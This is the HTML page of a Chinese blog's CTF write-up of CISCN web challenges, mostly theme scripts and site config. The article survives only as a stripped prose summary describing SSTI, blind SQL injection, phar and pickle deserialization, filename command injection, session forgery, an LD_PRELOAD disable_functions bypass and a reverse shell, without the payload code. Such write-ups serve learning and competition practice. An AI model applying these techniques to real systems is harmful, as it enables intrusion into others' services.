<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>CISCN国赛 | hybcx</title><meta name="keywords" content="CTF赛事"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="CISCN国赛"><meta name="application-name" content="CISCN国赛"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="CISCN国赛"><meta property="og:url" content="http://hybcx.xyz/2024/01/24/ctf-shua-ti-zhi-lu/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="[CISCN 2019华东南]Web11  首页展示了该公共地址API的一些功能，这里容易想到可能为SSTI注入，抓包然后添加xff头，进行ssti测试  确定为ssti了，同时首页提示我们这是smarty框架，并且后端语言也是PHP。直接上payload即可  这里看了wp发现还有很多姿势，做个记"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="[CISCN 2019华东南]Web11  首页展示了该公共地址API的一些功能，这里容易想到可能为SSTI注入，抓包然后添加xff头，进行ssti测试  确定为ssti了，同时首页提示我们这是smarty框架，并且后端语言也是PHP。直接上payload即可  这里看了wp发现还有很多姿势，做个记"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/01/24/ctf-shua-ti-zhi-lu/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'CISCN国赛',
  postAI: '',
  pageFillDescription: '[CISCN 2019华东南]Web11, 静态方法利用, [CISCN 2019华北Day2]Web1, [CISCN 2019华北Day1]Web1, [CISCN 2019初赛]Love Math, 方法一：, 方法二：, 方法三：, 方法四：, [CISCN 2019华北Day1]Web2, [CISCN 2019华东南]Web4, [CISCN 2019华东南]Double Secret, [CISCN 2022 初赛]ezpop, 参考文章, [CISCN 2022 初赛]online_crt, 利用条件, 参考文章, [CISCN 2023 华北]ez_date, 参考文章, [CISCN 2023 西南]do_you_like_read, 参考文章, [CISCN 2023 初赛]go_session, 前置说明, 代码审计, session伪造, 构造payload, 参考文章, [CISCN 2023 华北]pysym, 参考文章, [CISCN 2023 初赛]DeserBug, 参考文章, [CISCN 2023 西南]dataapi, 参考文章, [CISCN 2023 华北]normal_snake, 参考文章, [CISCN 2023 华北]ExifT0ol, 参考文章, 参考文章华东南首页展示了该公共地址的一些功能这里容易想到可能为注入抓包然后添加头进行测试确定为了同时首页提示我们这是框架并且后端语言也是直接上即可这里看了发现还有很多姿势做个记录的版本号可以使用标签来执行被包裹其中的指令注已经废弃标签强烈建议不要使用在仅在中可用可以让一个模板区域的字符原样输出这经常用于保护页面上的或样式表避免因为的定界符而错被解析攻击适用于它相比较于不同的是添加了一些特性每个必须有配对的也可以用和所有的条件表达式和函数都可以在内使用比如等静态方法利用通过获取类再调用其静态方法实现文件读写旧版本类有方法可以读取一个文件并返回其内容利用类的方法来写华北明确告诉我们是注入接下来先一下过滤字符可以看到的都是被过滤的很多关键的有等有意思的是这题似乎还有组合过滤的情况并且页面只会回显与对应的页面也就是说只能盲注根据题目提示的位于表列下那估计就是二分法爆破字符了接下来肯定就是想如何构造合适的来运行脚本这里也是陷入误区看了才明白忘记判断闭合方式了这里我们可以先尝试数学运算可以看到异或运算的结果不同说明为数字型注入那我们借着异或方式来构造由于页面有数据回显因此这里没必要用来判断华北进入首页发现是一个登录页面扫网站无果后尝试注册用户接着看到有一个上传文件的功能不过限制了上传马那我们正常上传指定文件类型发现出现下载和删除两个功能那很容易想到这两个功能肯定存在漏洞根据漏洞利用来看我们先找下载功能的漏洞点击抓包如图所示可以看到能实现任意文件的读取网盘管理管理面板上传文件你好下载删除我们可以发现存在敏感函数如果我们可以让为文件那就得到了接下来就思考如何控制变量我们先定位其所在函数可以看到其位于类的函数接下来看谁调用过该函数我们可以在类中的析构函数发现调用了函数但如果我们直接利用这个链子是不行的因为没有回显那我们只好接着找寻其他回显数据的地方了我们可以看到类中的析构函数会回显对应的和内容那这里肯定就是最终获取的地方了接下来我们可以再看一下魔术方法当访问一个类中不可访问的方法时调用这里会将函数名引入变量中之后循环对每一个变量对应的文件执行也就是方法之后将得到的结果存入数组中那链子基本明显了就是接下来就是寻找那里可以触发了可以看到虽然文件可以调用但是过滤了关键字而就没有任何限制因此我们肯定要从这里入手接下来就是构造文件内容了配合实现反序列化点击删除之后调用函数接着又调用函数实现反序列化后缀名必须为设置将自定义的存入添加要压缩的文件签名自动计算接着将生成的文件后缀改为上传之后点击删除抓包如下图所示得到初赛听说你很喜欢数学不知道你是否爱它胜过爱例子太长了不会算请不要输入奇奇怪怪的字符常用数学函数请不要输入奇奇怪怪的函数帮你算出答案这题代码逻辑简单就是传参进去的内容长度不超过并且其中的内容还要符合白名单这里的正则的作用就是提取变量中的函数名最终目的是要这里刷题少没知识点直接看学了动态函数中可以把函数名通过字符串的方式传递给一个变量然后通过此变量动态调用函数例如执行函数中函数名默认为字符串例如本题白名单中的和可以直接异或这就增加了构造字符的选择方法很多一个个学吧其中最关键的函数就是而我们最终的目的就是拼接函数拼接变量的思路来构造返回一字符串包含以进制的表示本身的进制由指定和都只能在和之间包括和高于十进制的数字用字母表示例如表示表示以及表示意思就是将输入数字的进制进行转换可以使用这个函数将其他进制数转为进制而且进制是包含所有数字和小写字母的但终究无法构造大写字母但又可以构造其他的小写字母函数让构造的函数转换十六进制转换为十进制十进制转换为十六进制函数把包含数据的二进制字符串转换为十六进制值转换十六进制字符串为二进制字符串那么我们就可以想象一下把先利用转换为十六进制在利用转换为十进制那么反过来就可以把一段数字转换为字符但是等不是白名单的函数要从哪里来这时候就要看的作用了因为上面的函数都是小写的所以可以利用此函数将一个十进制数的数字转为三十六进制的小写字符这里三十六进制是个数字个小写字母因此能够完整表示出一个函数名的所有字符那么怎么才能直到这个数呢我们可以先逆向将三十六进制字符转换为十进制数得到该数字最终逆向构造即可方法一接下来就是构造与字符串了框架如下后面两个是传参题目把东西都过滤的差不多了只有数字不可能有字母所以用传参类似于上文的但是这里把过滤了可以用代替构造如下得到将字符转换为十六进制得到将十六进制转为十进制得到将十进制转换为十六进制得到接下来编写进一步即可方法二可以构造传参此是小写的可以直接用转换获取全部请求头信息首先构造和得到这里不使用进制是因为精度会丢失尝试到的时候成功得到如下实际上就是找到键值为对应的方法三得到得到这里发现一个问题这个超过了的长度限制所以只能换进制最终如下但测试之后不成功分析分析方法四前面都是利用白名单的数学函数将数字转成字符串其实也可以异或构造这是脚本得到和华北首先是一个脚本爆破首页告诉我们要卖到那我们首先得找到它由于页面很多手动不现实故此需要脚本找找到如上图在页我们访问看看我们在结算的时候抓包看看如上图我们修改折扣进行购买随后看到右侧有个重定向我们访问看看看到这里只允许访问又看到其中有那毫无疑问就是伪造了那首先我们先要拿到这里也是看发现是通过爆破找到的直接上工具链接用法这里就不赘述了如上图可以看到是如上图进行伪造之后发送到发送之后是如下页面成功以身份登录接下来看一下源代码发现存在我们下载看看如果我们上述成功的话就会得到源码我们找到看到如下代码分析可以知道只有我们用户为随后向进行传参内容为序列化内容之后由于的存在我们可以执行恶意代码如下注意上述题目中的参数是经过函数处理的之后在环境下运行向传参即可这里点击页面的一键成为大会员之后抓包修改参数拿到华东南首页发现存在尝试几次发现被看了知道还有可以用直接读取源代码看代码知道将给了但如果我们访问路由的时候存在且其中的的键值为即可成功读取同时页面抓包发现这是这时候只需要重点看一下是如何生成的查询一番发现这里的函数是用来获取地址的并将其当做随机数种子来生成那我们先读取一下地址是什么得到之后带入上述生成的并用运行拿到接着使用脚本解密即可最后将加密后的结果修改进即可华东南扫出三个目录一个个试了就如下页面有点用发现有报错但这里不知道为何我不能看报错代码直接借用的了解密这里对内容进行解密随后对进行模板渲染其中还有一个似乎是过滤函数放一个加密脚本加密主函数我这里没管秘钥小于的情况小于不断重复填充即可原来的盒混乱后的盒调用加密程序成功用于加密字符串加密后是加密后的字符串是加密后的输出经过编码需要加密的字符串在这里修改这里有佬说明这里是后端对传入的值进行了加密加密方式为明文加密一次得到密文密文在加密一次得到明文所以要使用脚本对我们传入的恶意字符串进行一次加密这样传给系统既绕过检测同时还得到了明文得以执行不过这道题似乎直接用上述的直接读取即可下标为的是直接利用即可看了发现可以通过执行代码直接一步到位找到了位置随后读取初赛这道题先是一个源码泄露接着我们打开之后看到如下路由载初心不改你值得信赖的框架版本由亿速云独家赞助发布可以看到这里有反序列化入口点加上如下图直接暴露了版本那上网找现成的即可根据文章所说以及代码我们找到下直接传入参数即可参考文章反序列漏洞分析初赛跟着附件我们看到后端是由和处理的先看上述代码是用来生成证书的这里是用来处理路由下的和方法在函数中通过提取表单中指定参数的内容如果没有的话则按默认的来最后调用函数生成证书当访问路由时会调用函数执行并最终将得到的结果按数据格式返回这里目的是与目标服务器建立连接在想目标服务器发送请求之后返回目标服务器的响应接着我们看一下的代码首先在函数中如果访问路由则调用函数如果访问则调用函数其中函数就单纯返回一个字符串函数中首先获取旧的以及新的名字随后判断其是否为空且字符串中是否包含防止目录穿越如果正常的话接着判断路径如果不是空且为则成功执行进行名字的更替题目中出现了是中的一个用编写的脚本工具用于批量创建证书等文件命名的符号链接有个命令注入漏洞经过搜索网上并没有公开的可能因为这个漏洞非常鸡肋只能通过进行分析这里看不懂代码看了之后说这里的没有进行过滤反引号就直接拼接到了上述箭头处的命令中这意味着如果我们构造一个含有反引号的文件名即可进行根据上述的分析以及我们可以有个思路首先就是访问获取证书以及文件名随后就是要构造我们需要进行的文件名了如果构造好并成功执行函数之后我们直接访问路由其中函数会通过执行我们的文件名造成作用是让在证书目录中能够找到证书将当前目录切换到参数指定的目录使用打开目录并读取该目录下的文件列表使用获取文件列表并按字母顺序排序如果变量为真则删除符号链接文件对于符合特定文件名模式以结尾的文件调用子例程检查文件内容是否符合证书或格式如果文件包含证书则调用子例程处理证书如果文件包含则调用子例程处理利用条件执行目标目录下文件可控文件后缀符合要求文件内容必须包含证书或者是吊销列表文件名可控题目中生成证书的功能可以创建一个满足要求的文件这里要实现文件名可控重点就是中的函数了要调用该函数首先需要绕过这里先看一个语言结构体找不到原文章借用师傅的图了也就是说中必须含有待转移的字符也就是经过编码的字符具体也可参考该文章解释接下来先访问获取证书文件名接着请求修改证书名为恶意文件名这里放一些师傅们说的坑点文件名虽然可以包含大部分可打印字符但是有一个除外那就是斜杠不能使用斜杠这限制了命令执行的内容这里有位师傅做的是原环境他当时选择了编码以及截断环境变量方式但由于目标环境的限制无法成功接着他就使用现有的环境变量他通过命令在之后下载的文件看到了有一个变量值为接着变成功读取到了这里就记录一下这种思路这里我使用的是的环境根据所述这里使用方法即可为这里需要将编码空格编码接着继续将整体进行编码因为的存在这里我们访问触发上述代码的执行之后访问即可拿到目录可读参考文章第届全国大学生信息安全竞赛初赛初赛华北简单的反序列化这里的正则表达式的作用就是将文件内容中所有连续的空格换行和空白字符替换为空字符串重点就是绕过第二个语句这里的第一个条件语句让我们无法通过数据绕过下面的强等看了说可以利用数字和字符来绕过另一个是函数的绕过函数会对特定的字母转化为特定的时间表达格式因此构造如下参考文章反序列化小记录西南点击登陆之后根据提示用户名是这里可以进行密码爆破当然运气好直接弱口令即可登录进去之后可以发现含有文件上传文件编辑以及删除等功能我们先尝试文件上传但由于这是白盒审计我们先看看上传文件代码如何写检查文件名的扩展名是否已经是将文件名的扩展名替换为忽略其他后缀名并不做修改重点就是上面这一块儿这里的代码逻辑就是黑名单限制我们的文件后缀然后就不管了其余的任何文件后缀都认为是正确的那我们肯定就能利用来进行文件上传了文件内容如下这里指定的文件名可以随便上传之后会发现没有权限去读取这里就靠了他们做这道题都是线下的模式因此他们直接先是用自动化工具审计了一下我们可以看到第三个箭头处的似乎是一个后门文件对我这个小白来说我不知道为何后门文件直接就在源码里我们根据路径看一下该文件这里给出对该文件内容的解释这段代码实现了一个简单的利用绕过的方法具体来说它的功能是执行一个命令并将命令的输出重定向到指定文件中然后再读取该文件的内容并显示出来下面是代码的详细解析第一行通过请求接收三个参数要执行的命令输出文件路径和要加载的共享库路径接下来将接收到的参数和参数拼接成一个命令行字符串其中包括将命令的输出重定向到指定文件的部分使用函数将环境变量设置为这样在后续的函数调用中函数会在执行时加载环境变量中的命令将接收到的参数设置为环境变量以加载共享库文件这个共享库文件通常用于重载系统调用以实现特定功能比如绕过调用函数发送一封空邮件由于在设置环境变量后调用函数因此函数在执行时会加载环境变量中指定的共享库从而执行设置的命令最后通过读取输出文件的内容并以格式显示出来同时使用函数删除输出文件以保证安全性这段代码的主要目的是演示利用和重定向输出来绕过的的方法同时也展示了一个非常不安全的代码实现结合上述文件我们能知道为不过这里的路径与环境下不一致需要做出修改这里的在环境变量中参考文章西南赛区西南复赛初赛前置说明这里借用师傅对该试题框架的说明下载题目的附件是用的框架写的后端是由来实现而库使用了另一个库来实现对的安全传输这里所谓的安全传输是指保证中的值不能被看出来通过加密实现可选保证传输的不会被篡改的编码函数一共有四个主要步骤来实现这一目的序列化的值可以有多种形式首先将其序列化为字节切片方便后续操作加密这一步是可选的使用指定的对称加密方法加密密钥进行对进行加密计算值以保证不被篡改这里的是的缩写如何计算呢通过指定的哈希函数来计算对上述的加密后的求一个摘要编码当解密时反过来即可因为上述用于加密的方法与加密密钥用于认证的哈希方法与哈希密钥都是在服务器端设置的准确来说就是由这个库的接口所规定的通过加密密钥与认证密钥保证了不会被解密不会被篡改的两个目的代码审计路由的处理首先是靠环境变量的对加密接着判断中的键值是否为空如果是空的话赋值为但不论值如何这里最后回显都是路由防止这里判断的是否为如果不是则返回之后获取中的值如果没有则默认为之后通过框架进行渲染路由判断的是否为空如果为空则返回之后向本地的端口发送请求最后将响应的信息输出伪造我们需要进行伪造的原因是只有中的值为的时候我们才能利用的漏洞进行经过的参考由于没有找到泄露的点因此会尝试去爆破或者猜测从就是空这里他们猜测为空的原因是试了一会发现如果获取不存在的环境变量就会返回空值这里可以做出如上图所示的修改随后运行在中找到之后我们复制覆盖原有数据包中的即可如下图成功伪造接下来访问路由这里师傅们是对的进行畸形传参而引发报错但我不太懂为何这里将赋值为空即可报错将报错的源码复制到一个上打开即可如下图找到对应的源码注意到这里开启了根据师傅们所说这就表明框架是热加载的发生改变程序也会更新可以利用路由执行代码去覆盖掉实现会转义双引号可以通过和绕过传参我们知道模板引擎存在注入点可以执行的代码所以我们可以先上传文件覆盖再访问路由来执行命令构造这里就是知识盲区了使用包的进行文件上传第一个获取表单中的文件第二个参数为保存的目录所以使用的为但是我们在前面代码审计的时候知道双引号会被转义进行编码所以需要绕过我们利用中的返回主处理程序的名称例如如果处理程序是此函数将返回所以如果是在里返回的就是然后配合过滤器获取到最后一个字符串也就是文件名为还有一个返回里的的值我们可以在请求中的的值添加为所以构造最终但是在数据包中添加请求头时还要添加头对于添加这个头的解释是对表单提交浏览器会自动设置合适的请求同时生成一个唯一的边界字符串并在请求体中使用这个边界字符串将表单字段和文件进行分隔如果表单中包含文件上传的功能需要使用类型的请求体格式注意分隔符的开始和结束格式分隔符分隔符覆盖访问数据包如下成功上传然后就在去命令执行因为我们知道该路由获取是因此需要构造这样拼接以后才是参考文章初赛初赛初赛华北定义上传路径判断是否有文件存在判断文件大小生成上传路径生成最终上传路径拼接创建文件夹生成最终文件的保存路径对指定文件解压到指定目录检查是否存在符号链接检查是否为目录下载文件经分析上述的这一处代码的可控可造成先通过连接符号绕过再用反弹指令进行编码绕过一些特殊字符的过滤编码发送之前记得开启监听参考文章往届国赛复现华北赛区初赛找了几篇文章都是基本直接给出答都是老手了不屑于没做过几次就是个菜鸟这里下去补直接给出答案了今后学会再说这道题是经典链的翻版参考文章初赛西南决赛题目看不懂发布的人也少留着吧参考文章西南复赛华北又是反序列化看不懂考的是利用链如下参考文章华北分区赛记几道反序列化题目华北关闭调式模式定义路由传入了路由映射和作为参数用于渲染模板文件用于存储会话信息并初始化了和三个属性显示上传文件的页面显示上传文件的表单获取上传文件对象设置问文件上传所保存的目录如果请求中包含文件对象则获取文件名并提取文件后缀如果不是指定的后缀则给出警告但并不会直接也就是没影响将文件名和文件目录保存到会话的和属性中打开文件并将文件内容写入到文件中关闭文件检查会话中的和属性是否为空以确定是否有文件上传和是否已经获取过信息打开上传的文件并使用方法处理文件将结果保存到变量中遍历字典将以开头的标签和对应的值保存到字典中将保存到会话的属性中然后使用方法渲染结果页面并将和传递给模板进行显示分了上述代码在结合这道题就是通过上传文件来覆盖文件覆盖之后会自动经过路由进行处理最终会通过模板渲染回显到页面应该就是这里会造成漏洞既然是文件那就得利用反序列化以序列化数据存入最终渲染的时候反序列化执行我们的恶意文件虽然上述有白名单的检查但是没有之类的只是单纯的警告因此无用由于是可控的而且也没有对其做任何过滤此处就会有一个任意文件上传漏洞先构造这里不清楚的点就是为何在构造做了那些优化最后还是编码了一下将脚本输出内容上传到目录下的的文件中这里最后没有复现成功真的难受参考文章春秋杯春季联赛华北赛区部分题解参考文章模板注入漏洞入门篇华东南题解刷题记录华北赛区华北赛区华北赛区华北赛区初赛刷题记录初赛华东南华东南赛区华东南赛区',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-03-03 15:41:46',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul 